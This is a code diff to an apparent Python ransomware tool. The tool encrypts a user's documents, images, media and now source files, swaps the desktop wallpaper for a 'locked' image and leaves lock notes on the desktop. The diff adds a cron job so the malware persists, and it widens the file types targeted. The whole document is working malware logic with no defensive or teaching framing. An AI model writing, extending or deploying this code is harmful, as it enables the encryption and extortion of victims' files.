@@ -1,10 +1,9 @@
-from cryptography.fernet import Fernet
 from CryptoApp import CryptoApp
 import os
 import json
 from operator import itemgetter
-import glob
 from sys import argv
+import utils as fn
 
 
 
@@ -18,18 +17,20 @@ except IndexError:
 
 # Variables that must be initialized before CryptoApp constructor
 JSON_PATH = 'info.json'
-lock_wallpaper = os.path.realpath('locked.jpg')
+lock_wallpaper = os.path.abspath('locked.jpg')
+initScript = os.path.abspath('run/key.py')
 
-# Init the APP, do not encrypt these files specified in a constructor
+# Init the APP
 APP = CryptoApp(START_PATH)
 
 # Set the initial options
-APP.setFilesToSkip([JSON_PATH, '__pycache__', 'locked.jpg'])
+APP.setFilesToSkip([JSON_PATH, '__pycache__', 'locked.jpg', 'utils.py', 'run'])
 APP.setExtensionsToModify([
     '.txt', '.docx', '.odt',
     '.jpg', '.png', '.jpeg', '.gif',
     '.mp3', '.mp4', '.avi', 
-    '.json', '.conf'
+    '.json', '.conf',
+    '.py', '.js', '.html'
 ])
 
 # Init the variables
@@ -39,46 +40,32 @@ extra_files_name = 'Hello_lock'
 desktop_path = os.path.expanduser('~/Desktop')
 
 
-
+# Start decrypting
 if APP.isAlreadyEncrypted():
     # Remove every extra file that was created during encryption (on desktop)
-    for file in glob.glob(f'{desktop_path}/{extra_files_name}*.txt'):
-        try: os.remove(file)
-        except: continue
+    fn.removeGlobFiles(desktop_path, extra_files_name)
 
     APP.decrypt()
+    APP.cronAction(target_os, 'stop', initScript)
 
     # If decrypted successfully, handle the JSON file
-    if os.path.isfile(JSON_PATH):
+    new_wallpaper = fn.handleAndRemoveJSONinfo(JSON_PATH, APP)
 
-        # Parse the JSON file
-        json_file = APP.readFile(JSON_PATH)
-        to_dict = json.loads(json_file)
 
-        if 'original_background' in to_dict:
-            # Set the wallpaper variable
-            new_wallpaper = to_dict["original_background"]
-
-        # Remove the JSON file
-        os.remove(JSON_PATH)
-
+# Start encrypting
 else:
-    # Encrypt, and get the number of total modified files and directories
     APP.encrypt()
+    APP.cronAction(target_os, 'start', initScript)
+
+    # Get the total number of modified files and directories
     dirs_num, files_num = itemgetter('dirs', 'files')(APP.getCount()) 
 
     # Save some informations to a JSON file
-    asJSON = {}
-    asJSON['os'] = target_os
-    asJSON['de'] = target_de
-    asJSON["status"] = 'encrypted'
-    asJSON["directories"] = dirs_num
-    asJSON["files_modified"] = files_num
+    asJSON = fn.saveInfoToJSON(target_os, target_de, dirs_num, files_num)
 
     # Get the current wallpaper
     currentBG = APP.getDesktopBG(target_os, target_de)
-    if currentBG:
-        # And save it
+    if currentBG: # And save it to JSON
         asJSON["original_background"] = currentBG
     
     # Locked screen wallpaper
